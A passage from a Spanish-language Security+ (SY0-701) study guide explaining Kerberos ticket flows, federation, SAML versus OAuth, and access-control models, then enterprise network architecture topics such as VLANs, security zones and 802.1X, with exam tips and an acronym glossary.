| Servicio | Sigla | Función |
|---|---|---|
| **Servicio de Autenticación** | AS | Verifica la identidad del principal y emite el TGT |
| **Servicio de Concesión de Tickets** | TGS | Emite tickets de servicio para acceder a aplicaciones específicas |
 
#### Fase 1 — Autenticación con el KDC (obtención del TGT)
 
```
PASO 1: El principal envía al AS una solicitud de TGT
         → La solicitud está cifrada con el hash de la contraseña del usuario
         → El hash NO se transmite por la red
 
PASO 2: El AS verifica:
         ✅ La cuenta existe
         ✅ Puede descifrar la solicitud (hash de contraseña coincide con AD)
         ✅ La solicitud no ha caducado
 
PASO 3: El AS responde con:
         → TGT (Ticket Granting Ticket / Ticket de Concesión de Tickets):
           - Contiene: nombre del cliente, IP, sello de tiempo, período de validez
           - Cifrado con la clave secreta del KDC (el cliente NO puede leerlo)
         → Clave de sesión TGS:
           - Cifrada con el hash de la contraseña del usuario
```
 
> **El TGT es un token lógico.** Solo identifica quién eres; NO da acceso a recursos.
 
> **👉 Enfoque de Examen SY0-701:**
> Pregunta clave: "¿Qué emite el AS de Kerberos?" → El **TGT** y la **clave de sesión TGS**. "¿Se transmite la contraseña por la red en Kerberos?" → **No**; solo el hash de la fecha/hora cifrado con el hash de la contraseña. El TGT está cifrado con la clave secreta del KDC → el cliente no puede manipularlo.
 
### 4.3.4 Autorización de Inicio de Sesión Único (Kerberos TGS)
 
#### Fase 2 — Autorización con el TGS (obtención del ticket de servicio)
 
```
PASO 1: El principal envía al TGS:
         → Copia de su TGT (cifrado con clave KDC)
         → Nombre del servidor de aplicaciones de destino
         → Autenticador: ID de cliente con marca de tiempo, cifrado con clave de sesión TGS
 
PASO 2: El TGS verifica:
         ✅ Descifra el TGT con la clave secreta del KDC
         ✅ Descifra el autenticador con la clave de sesión TGS
         ✅ El ticket no ha caducado
         ✅ El ticket no se ha usado antes (prevención de replay attack / ataque de repetición)
 
PASO 3: El TGS responde con:
         → Clave de sesión de servicio: cifrada con la clave de sesión TGS
         → Ticket de servicio: contiene IP del sistema, SID del usuario y grupos, clave de sesión del servicio
           → Cifrado con la clave secreta del servidor de aplicaciones
 
PASO 4: El principal envía al servidor de aplicaciones:
         → El ticket de servicio (NO puede descifrarlo)
         → Otro autenticador con marca de tiempo, cifrado con clave de sesión del servicio
 
PASO 5: El servidor de aplicaciones descifra el ticket de servicio con su clave secreta
         → Obtiene la clave de sesión del servicio
         → Descifra el autenticador con esa clave
 
PASO 6 (OPCIONAL): El servidor responde con la marca de tiempo cifrada (autenticación mutua)
         → El principal verifica que el servidor es genuino
         → Previene ataques "on-path" (man-in-the-middle)
 
PASO 7: El servidor responde a las solicitudes de acceso según su ACL
```
 
#### Punto débil de Kerberos
 
- El **KDC es un único punto de falla (Single Point of Failure)**.
- **Solución:** Se implementan KDCs de respaldo (ej. múltiples controladores de dominio AD, cada uno ejecutando KDC).
> **👉 Enfoque de Examen SY0-701:**
> "¿Cómo previene Kerberos los ataques de repetición?" → Verifica que el ticket no se haya usado antes + comprueba el sello de tiempo. "¿Qué es la autenticación mutua en Kerberos?" → El servidor también se autentica ante el cliente enviando la marca de tiempo cifrada. El SID del usuario y sus grupos viajan en el **ticket de servicio**.

### 4.3.5 Federation (Federación de Identidades)
 
> **Analogía:** Como un pasaporte internacional: tu país (IdP) te emite el pasaporte (token/claim), y otros países (SP) confían en él para dejarte entrar sin crearte una nueva identidad.
 
#### ¿Qué es la Federación?
 
- Permite que una organización **confíe en las cuentas creadas y administradas por otra red**.
- Ejemplo empresarial: una empresa da acceso a socios/proveedores usando sus propias credenciales corporativas.
- Ejemplo de consumidor: iniciar sesión en Twitter con credenciales de Google (y viceversa).
#### Por qué Kerberos/LDAP no es suficiente para la federación
 
- Las aplicaciones web pueden no admitir Kerberos.
- Las redes de terceros pueden no admitir Active Directory/LDAP.
- Se necesitan **protocolos estándar interoperables** basados en identidad de "reclamos".
#### Terminología de federación
 
| Término | Descripción |
|---|---|
| **IdP (Identity Provider / Proveedor de Identidad)** | Gestiona y autentica las identidades de usuario. Emite tokens/reclamos. |
| **SP (Service Provider / Proveedor de Servicios)** | El servicio al que el usuario quiere acceder. Confía en el IdP. |
| **Reclamo (Claim)** | Token o documento firmado que el IdP emite como prueba de identidad/atributos |
| **Relación de confianza** | Acuerdo previo entre SP e IdP para aceptar los tokens del IdP |
 
#### Flujo de autenticación federada
 
```
1. La entidad intenta acceder al SP (Proveedor de Servicios)
2. El SP redirige al IdP (Proveedor de Identidad)
3. La entidad se autentica con el IdP
4. El IdP emite un reclamo (token firmado)
5. La entidad presenta el reclamo al SP
6. El SP valida el reclamo (gracias a la relación de confianza con el IdP)
7. El SP conecta la entidad con su base de datos local de cuentas y permisos
```
 
> **👉 Enfoque de Examen SY0-701:**
> La federación usa "identidad basada en reclamos". El SP confía en el IdP, no autentica directamente al usuario. Las preguntas suelen combinar federación con SAML u OAuth. Si el escenario menciona "confiar en las cuentas de otra organización" → **Federación**.

### 4.3.6 SAML (Security Assertion Markup Language)
 
#### ¿Qué es SAML?
 
- **SAML (Security Assertion Markup Language / Lenguaje de Marcado para Confirmaciones de Seguridad):** Protocolo para transmitir afirmaciones/reclamos de identidad entre el IdP y el SP.
- Las afirmaciones están escritas en **XML (eXtensible Markup Language / Lenguaje de Marcado Extensible)**.
- Las comunicaciones usan **HTTP/HTTPS** y **SOAP (Simple Object Access Protocol / Protocolo Simple de Acceso a Objetos)**.
- Los tokens se firman usando **firma XML (XML Signature)**.
- Las firmas digitales permiten que el SP confíe en el IdP.
#### Ejemplo de implementación SAML
 
**Amazon Web Services (AWS)** funciona como proveedor de servicios SAML, permitiendo que las empresas gestionen identidades de clientes en AWS sin crear cuentas directamente en la plataforma.
 
#### Estructura básica de una respuesta SAML (XML)
 
```xml
<samlp:Response ...>
  <saml:Issuer>https://idp.foo/sso</saml:Issuer>
  <ds:Signature>...</ds:Signature>
  <samlp:Status>...(success)...</samlp:Status>
  <saml:Assertion ...>
    <saml:Subject>...</saml:Subject>
    <saml:Conditions>...</saml:Conditions>
    <saml:AuthnStatement>...</saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute>...</saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```
 
#### Características técnicas de SAML
 
| Característica | Detalle |
|---|---|
| **Formato de datos** | XML |
| **Protocolo de transporte** | HTTP/HTTPS + SOAP |
| **Firma** | XML Signature (firma digital) |
| **Uso típico** | Federación empresarial (B2B), SSO web |
| **Caso de uso** | AWS, aplicaciones SaaS empresariales |
 
> **👉 Enfoque de Examen SY0-701:**
> SAML usa **XML** y **SOAP**. OAuth usa **JSON** y **REST**. Esta distinción es crucial en el examen. Si el escenario menciona "empresa que permite acceso a sus socios usando sus propias credenciales" y "XML" → **SAML**. AWS es el ejemplo canónico de SAML en la nube.

### 4.3.7 OAuth (Open Authorization)
 
#### El contexto: APIs RESTful vs. SOAP
 
| | SOAP | REST |
|---|---|---|
| **Tipo** | Protocolo estrictamente especificado | Marco arquitectónico flexible |
| **Formato** | XML | JSON |
| **Soporte móvil** | Limitado | ✅ Mejor |
| **Protocolo de auth** | SAML | OAuth |
 
#### ¿Qué es OAuth?
 
- **OAuth (Open Authorization / Autorización Abierta):** Protocolo para implementar autenticación y autorización en **APIs RESTful**.
- **Propósito:** Facilitar el intercambio de información (recursos) entre sitios sin compartir contraseñas.
- **Diferencia clave:** OAuth es principalmente un protocolo de **autorización** (permite que apps accedan a tus datos). Para autenticación se complementa con **OIDC (OpenID Connect)**.

#### Actores en OAuth
 
| Actor | Descripción |
|---|---|
| **Propietario del recurso (Resource Owner)** | El usuario que tiene la cuenta y autoriza el acceso |
| **Cliente OAuth** | La aplicación o sitio que quiere acceder a los datos del usuario |
| **Servidor de recursos (API Server)** | Donde están alojados los datos/recursos del usuario |
| **Servidor de autorización** | Procesa las solicitudes de autorización; puede gestionar múltiples servidores de recursos |
 
#### Flujo básico de OAuth
 
```
1. El cliente se registra en el servidor de autorización
   → Obtiene: Client ID (público) + Client Secret (privado/confidencial)
   → Registra una URL de redirección
 
2. El usuario (propietario del recurso) inicia el flujo de autorización
 
3. El usuario aprueba el acceso en el servidor de autorización
 
4. El cliente recibe un token de acceso validado
 
5. El cliente presenta el token al servidor de recursos
 
6. El servidor de recursos acepta la solicitud si el token es válido
```
 
#### JWT — JSON Web Token
 
- **Formato de datos que usa OAuth** para los datos de reclamos.
- Se puede pasar como cadena codificada en **Base64** en URLs y encabezados HTTP.
- Se puede **firmar digitalmente** para garantizar autenticación e integridad.

#### SAML vs. OAuth — Comparativa Maestra
 
| Característica | SAML | OAuth |
|---|---|---|
| **Formato de datos** | XML | JSON (JWT) |
| **Protocolo de transporte** | HTTP/HTTPS + SOAP | HTTP/HTTPS + REST |
| **Propósito principal** | Autenticación + Autorización | Autorización (+ OIDC para autenticación) |
| **Soporte móvil** | Limitado | ✅ Excelente |
| **Uso típico** | SSO empresarial, B2B | APIs de consumidor, apps móviles, redes sociales |
| **Firma** | XML Signature | JWT firmado digitalmente |
| **Ejemplo** | AWS SAML, federación corporativa | "Login con Google", "Login con Facebook" |
 
> **👉 Enfoque de Examen SY0-701:**
> La distinción SAML vs. OAuth es de las más preguntadas del tema. Regla rápida:
> - **XML + SOAP + Empresa** → SAML
> - **JSON + REST + App móvil/web** → OAuth
> El **JWT (JSON Web Token)** es el formato de token de OAuth. El "Login con Google" en un sitio es un ejemplo de OAuth/OIDC, no de SAML.

## 🗺️ Tabla Maestra de Comparación de Modelos de Control de Acceso
 
| Modelo | Sigla | Quién decide el acceso | Flexibilidad | Seguridad | Caso de uso típico |
|---|---|---|---|---|---|
| Discrecional | **DAC** | El propietario del recurso | Alta | Baja | Windows NTFS, Linux permisos básicos |
| Obligatorio | **MAC** | El sistema (etiquetas + niveles) | Baja | Alta | Sistemas militares, gubernamentales |
| Basado en funciones | **RBAC** | El sistema (por roles laborales) | Media | Media-Alta | Empresas con organigramas claros |
| Basado en atributos | **ABAC** | El sistema (múltiples atributos + contexto) | Alta | Alta | Sistemas en la nube, Zero Trust |
| Basado en reglas | **Rule-BAC** | El sistema (reglas definidas) | Variable | Variable | Firewalls, acceso condicional |

## 🚀 Glosario Rápido de Acrónimos
 
| Acrónimo | Significado (inglés) | Significado (español) |
|---|---|---|
| **IAM** | Identity and Access Management | Gestión de Identidades y Accesos |
| **MFA** | Multi-Factor Authentication | Autenticación de Multifactores |
| **2FA** | Two-Factor Authentication | Autenticación de Dos Factores |
| **OTP** | One-Time Password | Contraseña de Un Solo Uso |
| **TOTP** | Time-based One-Time Password | Contraseña de Un Solo Uso Basada en Tiempo |
| **HOTP** | HMAC-based One-Time Password | Contraseña de Un Solo Uso Basada en HMAC |
| **FIDO** | Fast Identity Online | Identidad en Línea Rápida |
| **U2F** | Universal 2nd Factor | Segundo Factor Universal |
| **PKI** | Public Key Infrastructure | Infraestructura de Clave Pública |
| **PIN** | Personal Identification Number | Número de Identificación Personal |
| **FRR** | False Rejection Rate | Tasa de Falso Rechazo |
| **FAR** | False Acceptance Rate | Tasa de Falsa Aceptación |
| **CER** | Crossover Error Rate | Tasa de Error de Cruce |
| **FER** | Failure to Enroll Rate | Tasa de Falla de Registro |
| **FNMR** | False Non-Match Rate | Tasa de Falsa No Coincidencia |
| **FMR** | False Match Rate | Tasa de Falsa Coincidencia |
| **HSM** | Hardware Security Module | Módulo de Seguridad de Hardware |
| **NFC** | Near Field Communication | Comunicación de Campo Cercano |
| **DAC** | Discretionary Access Control | Control de Acceso Discrecional |
| **MAC** | Mandatory Access Control | Control de Acceso Obligatorio |
| **RBAC** | Role-Based Access Control | Control de Acceso Basado en Funciones |
| **ABAC** | Attribute-Based Access Control | Control de Acceso Basado en Atributos |
| **ACL** | Access Control List | Lista de Control de Acceso |
| **PAM** | Privileged Access Management | Administración de Acceso Privilegiado |
| **SAW** | Secure Administrative Workstation | Estación de Trabajo Administrativa Segura |
| **JIT** | Just-in-Time | Justo a Tiempo |
| **ZSP** | Zero Standing Privileges | Privilegios Permanentes Cero |
| **UAC** | User Account Control | Control de Cuentas de Usuario |
| **GPO** | Group Policy Object | Objeto de Directiva de Grupo |
| **AD** | Active Directory | Directorio Activo |
| **SSO** | Single Sign-On | Inicio de Sesión Único |
| **KDC** | Key Distribution Center | Centro de Distribución de Claves |
| **TGT** | Ticket Granting Ticket | Ticket de Concesión de Tickets |
| **TGS** | Ticket Granting Service | Servicio de Concesión de Tickets |
| **AS** | Authentication Service | Servicio de Autenticación |
| **SID** | Security Identifier | Identificador de Seguridad |
| **NTLM** | NT LAN Manager | Administrador de LAN NT |
| **LDAP** | Lightweight Directory Access Protocol | Protocolo Ligero de Acceso a Directorios |
| **DN** | Distinguished Name | Nombre Distinguido |
| **RDN** | Relative Distinguished Name | Nombre Distinguido Relativo |
| **OU** | Organizational Unit | Unidad Organizacional |
| **DC** | Domain Component | Componente de Dominio |
| **IdP** | Identity Provider | Proveedor de Identidad |
| **SP** | Service Provider | Proveedor de Servicios |
| **SAML** | Security Assertion Markup Language | Lenguaje de Marcado para Confirmaciones de Seguridad |
| **XML** | eXtensible Markup Language | Lenguaje de Marcado Extensible |
| **SOAP** | Simple Object Access Protocol | Protocolo Simple de Acceso a Objetos |
| **OAuth** | Open Authorization | Autorización Abierta |
| **REST** | Representational State Transfer | Transferencia de Estado Representacional |
| **JWT** | JSON Web Token | Token Web JSON |
| **API** | Application Programming Interface | Interfaz de Programación de Aplicaciones |
| **LSASS** | Local Security Authority Subsystem Service | Servicio del Subsistema de la Autoridad de Seguridad Local |
| **SAM** | Security Accounts Manager | Administrador de Cuentas de Seguridad |
| **PAM** (Linux) | Pluggable Authentication Module | Módulo de Autenticación Conectable |
| **SSH** | Secure Shell | Shell Seguro |
| **VPN** | Virtual Private Network | Red Privada Virtual |
| **VLAN** | Virtual Local Area Network | Red de Área Local Virtual |
| **GPS** | Global Positioning System | Sistema de Posicionamiento Global |
| **ISP** | Internet Service Provider | Proveedor de Servicios de Internet |
| **IP** | Internet Protocol | Protocolo de Internet |
| **QR** | Quick Response | Respuesta Rápida |
| **NIST** | National Institute of Standards and Technology | Instituto Nacional de Estándares y Tecnología |
| **TPM** | Trusted Platform Module | Módulo de Plataforma de Confianza |
 
---
 
## 💡 Resumen de Preguntas Clave de Examen (Cheat Sheet)
 
| Pregunta típica | Respuesta |
|---|---|
| ¿Qué métrica biométrica iguala FRR y FAR? | **CER** |
| ¿Qué error biométrico es más grave en seguridad? | **FAR** (error tipo II) |
| PIN + contraseña, ¿es MFA? | **No** (ambos son conocimiento) |
| ¿Qué elimina la necesidad de secreto compartido en tokens físicos? | **FIDO U2F** |
| SMS como 2FA, ¿es factor de propiedad real? | **No**, es verificación de dos pasos |
| ¿Qué estándar elimina la contraseña completamente? | **FIDO2 / WebAuthn** |
| ¿Qué modelo de acceso usa etiquetas de clasificación? | **MAC** |
| ¿Qué modelo es más flexible pero más débil? | **DAC** |
| ¿Qué modelo es el más granular? | **ABAC** |
| ¿Qué previene el "privilege creep"? | **Auditorías periódicas de permisos** |
| ¿Qué significa ZSP? | **Zero Standing Privileges** (JIT) |
| ¿Qué protocolo usa AD para autenticación de red? | **Kerberos** (NTLM para legado) |
| ¿Qué almacena el TGT de Kerberos? | Nombre del cliente, IP, sello de tiempo, período de validez |
| ¿Qué es un punto único de falla en Kerberos? | El **KDC** |
| ¿Qué protocolo usa XML + SOAP? | **SAML** |
| ¿Qué protocolo usa JSON + REST? | **OAuth** |
| ¿Formato de token en OAuth? | **JWT** |
| ¿Qué habilita PAM en Linux? | Distintos proveedores de autenticación |
| ¿Dónde se almacenan los hashes en Linux? | `/etc/shadow` |
| ¿Qué atributo LDAP identifica el objeto más específico? | **CN** (Common Name) |
| ¿Qué es la attestation en FIDO2? | Prueba de que el autenticador es genuino (raíz de confianza) |
| ¿Qué es Shadow IT? | Uso de recursos TI no autorizados por el empleado |
| Control M de N, ¿qué significa? | M de N agentes deben colaborar para completar una tarea de seguridad |
 
---

## 5.1 Arquitectura de Red Empresarial

### 5.1.1 Conceptos de Arquitectura e Infraestructura

La **arquitectura de red** es la selección y colocación de:

- **Infraestructura de red:** Medios físicos, dispositivos y protocolos de direccionamiento/reenvío que soportan la conectividad básica.
- **Aplicaciones de red:** Servicios sobre la infraestructura (correo electrónico, facturación, web).
- **Activos de datos:** Información creada, almacenada y transferida por la actividad comercial.

> **Analogía:** Piensa en una ciudad. Las calles y semáforos son la *infraestructura*; los negocios que operan en esas calles son las *aplicaciones*; y los bienes que transportan los camiones son los *activos de datos*.

#### Ejemplo práctico: Flujo de trabajo del correo electrónico

| Componente | Función | Requisito de seguridad |
|---|---|---|
| **Dispositivo cliente** | Accede a la red y al buzón | Autenticación/autorización |
| **Servidor de buzón** | Almacena activos de datos | Confidencialidad + disponibilidad |
| **Servidor de transferencia de correo (MTA)** | Se conecta a Internet (no confiable) | Control estricto del perímetro |

> ⚠️ Colocar cliente, buzón y MTA en el **mismo segmento** introduce múltiples vulnerabilidades. La separación es clave.

### 5.1.2 Infraestructura de Red

El modelo **OSI (Open Systems Interconnection — Interconexión de Sistema Abierto)** de 7 capas es el marco de referencia fundamental:

| Capa OSI | Número | Dispositivos/Protocolos clave | Ejemplo |
|---|---|---|---|
| **Física (PHY)** | 1 | Cables UTP, fibra óptica, ondas radio | Par trenzado |
| **Enlace de datos** | 2 | Switch, Access Point (AP), `MAC` | `00-15-5D-01-CA-4A` |
| **Red** | 3 | Router, `IP`, `ARP`, `ND` | `10.1.0.192/24` |
| **Transporte** | 4 | `TCP`, `UDP` | Puertos, handshake |
| **Aplicación** | 7 | Servidores, `HTTP`, `SMTP`, `DNS`, `FTP`, `SMB` | `www.ejemplo.com` |

#### Tipos de nodos

- **Nodo host:** Inicia transferencias de datos (clientes, servidores).
- **Nodo intermediario:** Reenvía tráfico (switches, routers).

#### Alcances de red

- **LAN (Local Area Network — Red de Área Local):** Un solo sitio.
- **WAN (Wide Area Network — Red de Área Amplia):** Metropolitano, nacional o global.

#### Protocolo de Resolución de Direcciones

- **ARP (Address Resolution Protocol — Protocolo de Resolución de Direcciones):** Mapea una IP a una dirección MAC en IPv4.
- **ND (Neighbor Discovery — Protocolo de Descubrimiento Cercano):** Equivalente de ARP para IPv6.

#### FQDN (Fully Qualified Domain Name — Nombre de Dominio Completamente Calificado)

El **DNS (Domain Name System — Sistema de Nombres de Dominio)** resuelve FQDNs (ej. `www.empresa.com`) a direcciones IP. Opera en capa 7 pero es un servicio de infraestructura.

> **👉 Enfoque de Examen SY0-701:** CompTIA suele preguntar qué capa OSI opera cada dispositivo. Memoriza: Switch = Capa 2 (MAC), Router = Capa 3 (IP), TCP/UDP = Capa 4, Apps = Capa 7. Un distractor común es confundir ARP con DNS — ARP resuelve IP→MAC (capa 2/3), DNS resuelve nombre→IP (capa 7). También vigila preguntas sobre IPv6: usa ND en lugar de ARP.

### 5.1.3 Consideraciones de Infraestructura de Conmutación

#### Cableado Estructurado (topología en estrella)

Componentes del sistema:
1. **Cable de conexión (patch cable):** De la NIC del PC al puerto de pared.
2. **Cable estructurado:** Del puerto de pared al patch panel (por conductos).
3. **Cable de patch panel:** Del patch panel al puerto del switch.

> **Analogía:** El cableado estructurado es como el sistema eléctrico de un edificio: cada enchufe (puerto de pared) se conecta al cuadro eléctrico central (patch panel → switch).

#### Problemas de la topología plana (estrella básica)

- **Dominio de difusión (broadcast domain)** único: todos los hosts reciben todos los broadcasts.
- Con cientos de hosts: **penalizaciones de rendimiento**.
- Sin segmentación: **cualquier host puede comunicarse con cualquier otro** (red "plana").

#### Solución: Diseño jerárquico

```
[Internet]
    |
[Router Perimetral / Firewall]
    |
[Router/Switch Capa 3 — NÚCLEO]
    |        |         |
[Switch   [Switch   [Switch
 Acceso]   Acceso]   Acceso]
    |          |         |
[Impresoras] [WS+VoIP] [Servidores]
```

- **Switch de acceso:** Conecta hosts en un bloque (topología en estrella).
- **Switch de Capa 3:** Combina enrutamiento y conmutación en el núcleo.
- Los **routers** entre bloques crean **dominios de difusión separados** y permiten controlar el flujo entre zonas.

> **👉 Enfoque de Examen SY0-701:** El concepto de red "plana" vs. diseño jerárquico es frecuente. Una red plana significa que si un atacante penetra el perímetro, tiene libertad de movimiento total. El diseño jerárquico crea zonas con políticas de acceso diferenciadas. Vigilar distractores que confunden switch de acceso con switch de núcleo (capa 3).

### 5.1.4 Consideraciones sobre la Infraestructura de Enrutamiento

#### Protocolo de Internet (IP)

- **IPv4:** Dirección de 32 bits en notación decimal con puntos + prefijo de red.
  - Ejemplo: `10.1.1.0/24` → Red `10.1.1.x`, máscara `255.255.255.0`.
- **IPv6:** Dirección de 128 bits en notación hexadecimal.
  - Ejemplo: `2001:db8::abc:0:def0:1234`
  - Últimos 64 bits = ID de interfaz del host.
  - Primeros 64 bits = información de red jerarquizada.

#### VLAN (Virtual LAN — Red de Área Local Virtual)

- Valor de ID de VLAN: entre **2 y 4094**.
- Cada VLAN es un **dominio de difusión independiente de capa 2**.
- El tráfico entre VLANs **debe pasar por un dispositivo de capa 3** (router o switch L3).
- Se pueden asignar diferentes puertos del **mismo switch físico** a diferentes VLANs.
- La topología de VLAN puede extenderse a través de **múltiples switches**.

> **Analogía:** Las VLANs son como plantas de un edificio de oficinas compartidas. Aunque todos están en el mismo edificio físico (mismo switch), los equipos de marketing y finanzas tienen acceso solo a sus propias áreas. Para pasar de una planta a otra, debes usar el ascensor (el router).

#### Ejemplo VoIP vs. Estaciones de trabajo

| VLAN | Subred | Hosts |
|---|---|---|
| VLAN 32 | `10.1.32.0/24` | Estaciones de trabajo |
| VLAN 40 | `10.1.40.0/24` | Teléfonos VoIP |

Un teléfono VoIP en `10.1.40.100` que quiere contactar a `10.1.32.100` **debe pasar por el router**, aunque estén en el mismo switch físico.

> **👉 Enfoque de Examen SY0-701:** Las VLANs son un tema frecuente en escenarios de segmentación. CompTIA pregunta por qué las VLANs mejoran la seguridad (dominios de difusión separados) y cómo el tráfico inter-VLAN requiere un dispositivo L3. Distractor común: confundir VLAN con VPN. También vigila: el "hopping de VLAN" (VLAN hopping) es un ataque que explota configuraciones incorrectas de VLANs.

### 5.1.5 Zonas de Seguridad

Una **topología de seguridad basada en zonas** clasifica segmentos según sus requisitos de seguridad.

> **Analogía:** Las zonas de seguridad son como las áreas de un aeropuerto: zona pública (check-in), zona de seguridad media (salas de espera), zona restringida (pistas), y zona ultra-restringida (torre de control). Para pasar de una a otra, hay controles obligatorios.

#### Análisis de requisitos por tipo de sistema

| Tipo de sistema | Prioridad CIA | Notas |
|---|---|---|
| Bases de datos / archivos | Confidencialidad + Integridad | Separar tipos de datos reduce impacto de brechas |
| Dispositivos cliente | Integridad + Disponibilidad | No deben almacenar datos confidenciales |
| Servidores públicos (web, email, acceso remoto) | Integridad + Disponibilidad | No almacenar credenciales; no son de plena confianza |
| Servidores de infraestructura (auth, directorio, monitoring) | CIA completo | Compromiso = impacto catastrófico |

#### Ejemplo de zonas en diagrama

| Zona | Privilegio | Contenido |
|---|---|---|
| Zona 1 | Bajo | Impresoras |
| Zona 2 | Medio | Estaciones de trabajo, teléfonos VoIP |
| Zona 3 | No confiable | Red de invitados, servidores públicos |
| Zona 4 | — | Internet |
| Zona 5 | Alto | Servidores privados, bases de datos |

#### Reglas clave de control de tráfico entre zonas

- El tráfico entre zonas **debe controlarse mediante un cortafuegos**.
- Las políticas deben aplicar el **principio del mínimo privilegio**.
- Cada zona debe tener un **punto de entrada/salida conocido**.
  - Ejemplo de violación: colocar un AP inalámbrico dentro de una zona cuyo único acceso autorizado es un router.
- Los servidores de aplicaciones pueden solicitar a bases de datos; **nunca al revés**.
- Los hosts de la zona de invitados pueden acceder a Internet, **no a la LAN corporativa**.
- Los servidores públicos aceptan solicitudes de Internet, pero **no pueden iniciar solicitudes a la LAN corporativa**.

> **👉 Enfoque de Examen SY0-701:** CompTIA suele dar escenarios donde hay que identificar qué zona tiene una configuración incorrecta. Clave: los servidores expuestos públicamente NO deben estar en la misma zona que los servidores internos. También verifica: una zona sin punto de acceso único es una debilidad arquitectónica. El principio de mínimo privilegio se aplica a los flujos de tráfico entre zonas.

### 5.1.6 Superficie de Ataque

La **superficie de ataque** es el conjunto de todos los puntos por los que un actor de amenazas podría obtener acceso.

#### Análisis por capa OSI

| Capa | Vector de ataque potencial |
|---|---|
| **L1/L2** | Host no autorizado conectado a puerto de pared o red inalámbrica → comunicación en el mismo dominio de broadcast |
| **L3** | Host no autorizado obtiene dirección IP válida (posiblemente por suplantación/spoofing) → comunica con otras zonas |
| **L4/L7** | Host no autorizado establece conexiones a puertos `TCP`/`UDP` y se comunica con protocolos/servicios de aplicación |

#### Debilidades típicas de arquitectura

| Debilidad | Descripción | Riesgo |
|---|---|---|
| **Puntos únicos de falla (SPOF)** | Un solo servidor/dispositivo/canal crítico | Alta disponibilidad comprometida |
| **Dependencias complejas** | Muchos sistemas necesarios para un servicio | La falla de uno afecta todo |
| **Disponibilidad sobre CIA** | "Atajos" para poner servicios en marcha rápido | Riesgos de seguridad a largo plazo |
| **Falta de documentación** | Segmentos/aparatos añadidos sin control de cambios | Falta de visibilidad de la red |
| **Dependencia excesiva del perímetro** | Red interna "plana" | Si el borde cae, el atacante tiene libertad total |

#### Defensa en profundidad (Defense in Depth)

Múltiples capas de controles **preventivos, detectivos y correctivos** en cada capa del modelo OSI. No dependas de un solo control.

> **👉 Enfoque de Examen SY0-701:** "Defensa en profundidad" es un término que CompTIA usa frecuentemente. Los distractores intentan confundirlo con "redundancia" (que es sobre disponibilidad). La superficie de ataque se *reduce*, no se elimina. Vigilar preguntas sobre la red "plana" — la respuesta correcta siempre apunta a la segmentación y a la limitación del movimiento lateral.

### 5.1.7 Seguridad del Puerto

Cada puerto de pared y puerto de switch es un vector de ataque físico potencial.

#### Medidas básicas

- Restringir el **acceso físico** a switches (salas de servidores con llave).
- **Desactivar administrativamente** puertos de pared no utilizados.
- Retirar el cable de conexión del puerto de switch.

#### Filtrado MAC y Limitación MAC

- Configurar que un puerto de switch solo permita **ciertas direcciones MAC**.
- Puede especificarse un **límite de número de MACs** permitidas.
  - Ejemplo: máx. 2 MACs → el switch registra las 2 primeras y descarta el resto.
- **Limitación:** Las MACs pueden ser **suplantadas (spoofed)**, por lo que este método no es completamente seguro.

#### 802.1X y EAP (Extensible Authentication Protocol — Protocolo de Autenticación Extensible)

> **Analogía:** 802.1X es como un torniquete en el metro: hasta que no pases tu tarjeta (autenticación), el torniquete no se abre. El validador (autenticador) no lee la tarjeta directamente; la envía al sistema central (servidor RADIUS) para verificarla.

El estándar **IEEE 802.1X PNAC (Port-based Network Access Control — Control de Acceso a Red Basado en Puertos)** implementa la arquitectura **AAA (Authentication, Authorization, Accounting — Autenticación, Autorización y Contabilidad):**

| Rol | Descripción | Ejemplo |
|---|---|---|
| **Supplicant (Suplicante)** | Dispositivo que solicita acceso | PC o laptop del usuario |
| **Authenticator (Autenticador)** | Dispositivo de conmutación; NO valida directamente | Switch de red |
| **Authentication Server (Servidor de autenticación)** | Valida credenciales y emite autorización | Servidor RADIUS |

#### Protocolos de 802.1X

- **EAP (Extensible Authentication Protocol — Protocolo de Autenticación Extensible):** Framework para diferentes métodos de autenticación. Puede usar certificados digitales, tarjetas inteligentes, etc.
- **RADIUS (Remote Authentication Dial-In User Service — Servicio de Autenticación Remota de Usuario por Acceso Telefónico):** Protocolo de comunicación entre autenticador (cliente RADIUS) y servidor de autenticación (servidor RADIUS).
- **EAPoL (EAP over LAN):** El switch abre solo este protocolo hasta que el host se autentica.

#### Flujo de autenticación 802.1X

```
[Supplicant] ---(EAPoL)---> [Switch/Autenticador] ---(RADIUS)---> [Servidor RADIUS]
                                                   <---(Acceso aceptado/denegado)---
         <---(Acceso completo o denegado)---
```

1. Servidor RADIUS y cliente preconfigurados con el mismo **secreto compartido**.
2. Supplicant se conecta → switch habilita solo EAPoL.
3. Supplicant transmite datos EAP (cifrados).
4. Switch descifra con secreto compartido y reenvía al servidor RADIUS.
5. RADIUS valida la credencial.
6. RADIUS emite "acceso aceptado".
7. Switch habilita el canal de red para tráfico regular.

> **👉 Enfoque de Examen SY0-701:** 802.1X es un tema muy frecuente. Los tres roles (Supplicant/Authenticator/Authentication Server) suelen aparecer en preguntas de escenario. Distractor común: confundir el autenticador (switch) con el servidor de autenticación (RADIUS). El switch es el "bouncer" del club, no quien tiene la lista de invitados — eso es RADIUS. También: EAP es el *método*, RADIUS es el *protocolo de transporte* entre switch y servidor.

### 5.1.8 Aislamiento Físico (Air Gap)

> **Analogía:** Un sistema con air gap es como una caja fuerte dentro de una cámara acorazada sin conexión a ningún sistema externo. La única forma de introducir o extraer información es físicamente.

Un host **air-gapped (aislado por segmento de aire)** no está conectado físicamente a ninguna red.

#### Casos de uso típicos

- **Autoridad de certificación raíz (Root CA)** en PKI (Public Key Infrastructure — Infraestructura de Clave Pública).
- Hosts para **análisis de ejecución de malware**.
- **Bases militares, sitios gubernamentales e instalaciones industriales.**

#### Desafíos del air gap

- Gestión del dispositivo: **solo en terminal local**.
- Actualizaciones: **USB o medios ópticos** (que son vectores de ataque potenciales y deben analizarse antes de su uso).

> **👉 Enfoque de Examen SY0-701:** El air gap es la solución más extrema de segmentación. CompTIA puede preguntar por qué el USB es un vector de riesgo en sistemas air-gapped. La respuesta correcta: el malware puede propagarse via medios físicos (ej. el famoso caso de Stuxnet). Distractor: pensar que el air gap es invulnerable — no lo es si los medios físicos no se analizan.

### 5.1.9 Consideraciones Arquitectónicas

Al seleccionar una arquitectura, evalúa múltiples factores de forma equilibrada:

| Factor | Descripción | Consideración clave |
|---|---|---|
| **Costos** | Desembolso de capital inicial + mantenimiento continuo | Calcular según reducción de pérdidas por incidentes |
